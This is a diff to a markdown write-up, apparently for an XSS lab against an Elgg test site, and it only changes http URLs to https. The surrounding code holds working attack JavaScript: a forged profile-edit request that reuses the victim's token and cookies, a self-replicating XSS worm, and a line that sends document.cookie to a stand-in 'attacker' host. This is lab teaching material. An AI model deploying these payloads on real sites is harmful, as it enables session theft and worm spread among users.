@@ -253,7 +253,7 @@ The javascript code must contain
 
 ```js
 <script type="text/javascript">
-var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+var sendurl="https://www.xsslabelgg.com/action/profile/edit";
 var ts=elgg.security.token__elgg_ts;
 var token=elgg.security.token.__elgg_token;
 
@@ -266,8 +266,8 @@ ff.setRequestHeader("Connection","keep-alive");
 ff.setRequestHeader("Cookie",document.cookie);
 ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 
-// http://www.xsslabelgg.com/profile/user14/edit
-ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
+// https://www.xsslabelgg.com/profile/user14/edit
+ff.setRequestHeader("Referer","https://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
 
 // __elgg_ts=AAAA&__elgg_token=BBBB&description=User-11-is-great&name=user14&accesslevel[description]=2&guid=user14Id0000001
 params="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
@@ -335,7 +335,7 @@ var selfProp = "<script id==\"worm\" type=\"text/javascript\">"
 <script id="daut" type="text/javascript">
 var sp="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML).concat("</").concat("script>");
 
-var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+var sendurl="https://www.xsslabelgg.com/action/profile/edit";
 var ts=elgg.security.token__elgg_ts;
 var token=elgg.security.token.__elgg_token;
 
@@ -347,7 +347,7 @@ ff.setRequestHeader("Connection","keep-alive");
 ff.setRequestHeader("Cookie",document.cookie);
 ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 
-ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));
+ff.setRequestHeader("Referer","https://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));
 
 params="__elgg_ts=".concat(ts).concat("&__elgg_token=").concat(token).concat("&description=User-11-is-great")
 .concat(escape(sp)).concat("&name=").concat(elgg.session.user["username"]).concat("&accesslevel[description]=2&guid=")
@@ -380,7 +380,7 @@ http网址www.webpage.org/task/Rule1?query=<h3>Hello from XSS</h3>
 
 ```js
 <script>
-window.location='http://attacker/?cookie='+document.cookie
+window.location='https://attacker/?cookie='+document.cookie
 </script>
 ```
 ![persistent-xss](https://i.imgur.com/NznIJNi.png)
